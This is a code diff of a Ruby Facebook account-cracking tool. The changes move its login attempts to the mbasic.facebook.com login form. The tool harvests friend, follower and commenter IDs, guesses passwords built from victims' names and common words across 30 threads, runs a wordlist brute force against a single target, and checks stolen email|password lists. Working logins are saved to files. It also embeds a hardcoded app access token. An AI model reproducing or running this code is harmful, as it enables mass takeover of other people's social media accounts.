@@ -577,16 +577,20 @@ def crack!
   loop do
     begin
       usr = $file.readline.strip
-      uri = URI('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + usr + '&locale=en_US&password=' + $pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-      req = Net::HTTP.get(uri)
-      req = JSON.parse(req)
-      if req.key? ('access_token')
+      uri = URI("https://mbasic.facebook.com/login.php")
+      auth = {"email"=>usr,"pass"=>$pwd,"login"=>"submit"}
+      req = Net::HTTP::Post.new(uri)
+      req['user-agent'] = $user_agent
+      req.set_form_data(auth)
+      res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
+      kue = res['set-cookie']
+      if kue.include? ('c_user')
         $ok += 1
         z = File.open("multi.txt","a")
         z.write("#{usr} | #{$pwd}\n")
         z.close()
         puts ("#{$g}[OK] #{usr} | #{$pwd}")
-      elsif req.key? ('error_msg') and req['error_msg'].include? ('www.facebook.com')
+      elsif kue.include? ('checkpoint')
         $cp += 1
         z = File.open("multi.txt","a")
         z.write("#{usr} | #{$pwd}\n")
@@ -625,12 +629,12 @@ def Super()
       puts ($logo)
       puts ("#{$w}#{'═'*52}")
       puts ("#{$w}[+] Pleace Wait")
-      a = Request("me/friends?")
+      a = Request("me/friends?fields=id,name")
       b = a['data'].map {|i| i['id']}
       puts ("#{$w}[+] Total Id : #{b.length}")
       puts ("#{$w}[+] CRACK!")
       puts ("#{$w}#{'═'*52}")
-      main(b)
+      main(a['data'])
       puts ("#{$w}#{'═'*52}")
       puts ("#{$g}[✓] Total OK : #{$ok}")
       puts ("#{$y}[!] Total CP : #{$cp}")
@@ -641,7 +645,7 @@ def Super()
       puts ($logo)
       puts ("#{$w}#{'═'*52}")
       puts ("#{$w}[+] Pleace Wait")
-      a = Request("me?subscribers?limit=5000")
+      a = Request("me/subscribers?fields=id,name&limit=5000")
       if a['data'].empty?
         puts ("#{$y}[!] Your Account Has No Followers")
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
@@ -652,7 +656,7 @@ def Super()
         puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['summary']['total_count']
         puts ("#{$w}[+] CRACK!")
         puts ("#{$w}#{'═'*52}")
-        main(b)
+        main(a['data'])
         puts ("#{$w}#{'═'*52}")
         puts ("#{$g}[✓] Total OK : #{$ok}")
         puts ("#{$y}[!] Total CP : #{$cp}")
@@ -682,7 +686,7 @@ def Super()
         puts ("#{$y}[!] Total ID that can be cracked : #{c.length}") if c.length != b['summary']['total_count']
         puts ("#{$w}[!] CRACK!")
         puts ("#{$w}#{'═'*52}")
-        main(c)
+        main(b['data'])
         puts ("#{$w}#{'═'*52}")
         puts ("#{$g}[✓] Total OK : #{$ok}")
         puts ("#{$y}[!] Total CP : #{$cp}")
@@ -706,8 +710,8 @@ def Super()
         Super()
       else
         puts ("#{$w}[+] Posted by #{a['from']['name']}")
-        b = Request("#{id}/comments?summary=true&limit=5000")
-        c = b['data'].map {|i| i['from']['id']}.uniq
+        b = Request("#{id}/comments?fields=from&summary=true&limit=5000")
+        c = b['data'].map {|i| {"id"=> i['from']['id'],"name"=> i['from']['name']}}.uniq
         puts ("#{$w}[+] Total Id : #{c.length}")
         puts ("#{$w}[!] CRACK!")
         puts ("#{$w}#{'═'*52}")
@@ -736,7 +740,7 @@ def Super()
         puts ("#{$w}[+] Total id : #{c.length}")
         puts ("#{$w}[+] CRACK!")
         puts ("#{$w}#{'═'*52}")
-        main(c)
+        main(b['data'])
         puts ("#{$w}#{'═'*52}")
         puts ("#{$g}[✓] Total OK : #{$ok}")
         puts ("#{$y}[!] Total CP : #{$cp}")
@@ -766,7 +770,7 @@ def Super()
         puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['subscribers']['summary']['total_count']
         puts ("#{$w}[+] CRACK!")
         puts ("#{$w}#{'═'*52}")
-        main(b)
+        main(a['subscribers']['data'])
         puts ("#{$w}#{'═'*52}")
         puts ("#{$g}[✓] Total OK : #{$ok}")
         puts ("#{$y}[!] Total CP : #{$cp}")
@@ -782,54 +786,35 @@ def Super()
   end
 end
 
-def main(id)
+def main(data)
   pool = ThreadPool.new(size: 30)
-  id.each do |i|
+  data.each do |usr|
     pool.schedule do
       begin
-        lanjut = true
-        pw1 = ["Sayang","Anjing","Bangsat","Kontol","Doraemon"]
-        for pass in pw1
-          url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + i + '&locale=en_US&password=' + pass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
-          req = URI.open(url,'User-Agent'=>$user_agent).read()
-          res = JSON.parse(req)
-          if res.key? ('access_token')
-            $ok += 1
-            File.open("super.txt", "a") { |f| f.write "#{i} | #{pass}\n" }
-            puts ("#{$g}[OK] #{i} | #{pass}#{$a}")
-            lanjut = false
-            break
-          elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
-            $cp += 1
-            File.open("super.txt", "a") { |f| f.write "#{i} | #{pass}\n" }
-            puts ("#{$y}[CP] #{i} | #{pass}#{$a}")
-            lanjut = false
-            break
-          end
+        name = usr['name'].split
+        if name.length == 1
+          password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345']
+        else
+          password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.last + '123',name.last + '12345']
         end
-        if lanjut
-          a = Request("#{i}?")
-          name = ERB::Util.url_encode(a['name'])
-          first = ERB::Util.url_encode(a['first_name'])
-          last = ERB::Util.url_encode(a['last_name'])
-          pw2 = [name + '123',name + '12345',first + '123',first + '12345',last + '123',last + '12345']
-          for pwd in pw2
-            params = {'access_token'=> '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32','format'=> 'JSON','sdk_version'=> '2','email'=> i,'locale'=> 'en_US','password'=> pwd,'sdk'=> 'ios','generate_session_cookies'=> '1','sig'=> '3f555f99fb61fcd7aa0c44f58f522ef6'}
-            uri = URI("https://b-api.facebook.com/method/auth.login")
-            uri.query = URI.encode_www_form(params)
-            req = Net::HTTP.get_response(uri)
-            res = JSON.parse(req.body)
-            if res.key? ('access_token')
-              $ok += 1
-              File.open("super.txt", "a") { |f| f.write "#{i} | #{pwd}\n" }
-              puts ("#{$g}[OK] #{i} | #{pwd}#{$a}")
-              break
-            elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
-              $cp += 1
-              File.open("super.txt", "a") { |f| f.write "#{i} | #{pwd}\n" }
-              puts ("#{$y}[CP] #{i} | #{pwd}#{$a}")
-              break
-            end
+        for i in password
+          uri = URI("https://mbasic.facebook.com/login.php")
+          auth = {'email'=>usr['id'],'pass'=>i,'login'=>'submit'}
+          req = Net::HTTP::Post.new(uri)
+          req['user-agent'] = $user_agent
+          req.set_form_data(auth)
+          res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
+          kue = res['set-cookie']
+          if kue.include? ('c_user')
+            $ok += 1
+            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
+            puts ("#{$g}[OK] #{usr['id']} | #{i}")
+            break
+          elsif kue.include? ('checkpoint')
+            $cp += 1
+            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
+            puts ("#{$y}[CP] #{usr['id']} | #{i}")
+            break
           end
         end
       rescue SocketError
@@ -846,7 +831,7 @@ def main(id)
   end
   pool.shutdown
 end
-            
+      
 
 def Brutal()
   system ('clear')
@@ -854,7 +839,7 @@ def Brutal()
   puts ("#{$w}#{'═'*52}")
   print ("#{$r}[+] #{$g}Id#{$w}/#{$g}email#{$w}/#{$g}Phone #{$w}(#{$g}Target#{$w}) #{$r}: ")
   id = gets.chomp!
-  print ("#{$r}[+] #{$g}Wordlist #{$w}ext(list.txt) #{$r}: ")
+  print ("#{$r}[+] #{$g}Wordlist #{$w}ext(list.txt)  #{$r}: ")
   file = gets.chomp!
   if File.file? (file)
     password = File.readlines(file, chomp: true)
@@ -863,17 +848,20 @@ def Brutal()
     puts ("#{$w}#{'═'*52}")
     for pw in password
       begin
-        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
+        uri = URI ("https://mbasic.facebook.com/login.php")
+        req = Net::HTTP::Post.new(uri)
+        req.set_form_data({"email"=>id,"pass"=>pw,"login"=>"submit"})
+        req['user-agent'] = $user_agent
         puts ("#{$r}[+] #{$g}Login As #{$r}: #{$w}-> #{$g}#{id} #{$w}-> #{$g}#{pw}#{$a}")
-        req = URI.open(url,'User-Agent'=>$user_agent).read()
-        res = JSON.parse(req)
-        if res.key? ('access_token')
+        log = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
+        res = log['set-cookie']
+        if res.include? ('c_user')
           puts ("#{$w}#{'═'*52}")
           puts ("#{$g}[✓] Success")
           puts ("#{$g}[✓] username : #{id}")
           puts ("#{$g}[✓] password : #{pw}")
           abort ("#{$r}[!] exit")
-        elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
+        elsif res.include? ('checkpoint')
           puts ("#{$w}#{'═'*52}")
           puts ("#{$y}[!] Account Has Been Checkpoint")
           puts ("#{$y}[✓] username : #{id}")
@@ -2299,13 +2287,16 @@ def lain()
           sep = i.split('|')
           email = sep.first
           pass = sep.last
-          url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=#{email}&locale=en_US&password=#{pass}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
-          req = URI.open(url,'User-Agent'=>$user_agent).read()
-          res = JSON.parse(req)
-          if res.key? ('access_token')
+          uri = URI("https://mbasic.facebook.com/login.php")
+          req = Net::HTTP::Post.new(uri)
+          req['user-agent'] = $user_agent
+          req.set_form_data({'email'=>email,'pass'=>pass,'login'=>'submit'})
+          log = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
+          res = log['set-cookie']
+          if res.include? ('c_user')
             ok += 1
             puts ("#{$g}[OK✓] #{email} | #{pass}")
-          elsif res.key? ('error_msg') and res['error_msg'].include?  ('www.facebook.com')
+          elsif res.include? ('checkpoint')
             cp += 1
             puts ("#{$y}[CP+] #{email} | #{pass}")
           else
